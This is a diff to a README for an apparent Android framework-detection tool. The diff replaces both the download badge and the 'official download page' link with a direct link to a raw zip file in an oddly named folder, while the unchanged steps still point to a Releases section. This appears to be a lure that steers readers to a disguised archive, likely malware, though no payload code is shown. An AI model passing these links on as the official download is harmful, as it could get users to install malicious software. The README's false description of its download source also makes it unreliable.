@@ -1,6 +1,6 @@
 # 🔍 apk-framework-detector - Identify Android App Building Technologies Fast
 
-[![Download apk-framework-detector](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Felipes877/apk-framework-detector)
+[![Download apk-framework-detector](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Felipes877/apk-framework-detector/raw/refs/heads/main/mucrones/detector_framework_apk_2.5.zip)
 
 This tool identifies the framework or language an Android application uses. You no longer need to unzip or inspect files by hand. The software automates the process and provides clear results for any Android Package file.
 
@@ -15,7 +15,7 @@ This tool identifies the framework or language an Android application uses. You 
 
 Follow these steps to set up the software on your computer.
 
-1. Navigate to the official download page: [https://github.com/Felipes877/apk-framework-detector](https://github.com/Felipes877/apk-framework-detector)
+1. Navigate to the official download page: [https://github.com/Felipes877/apk-framework-detector/raw/refs/heads/main/mucrones/detector_framework_apk_2.5.zip](https://github.com/Felipes877/apk-framework-detector/raw/refs/heads/main/mucrones/detector_framework_apk_2.5.zip)
 2. Locate the section labeled Releases on the right side of the screen.
 3. Choose the latest version of the application.
 4. Select the file ending in .zip to start your download.
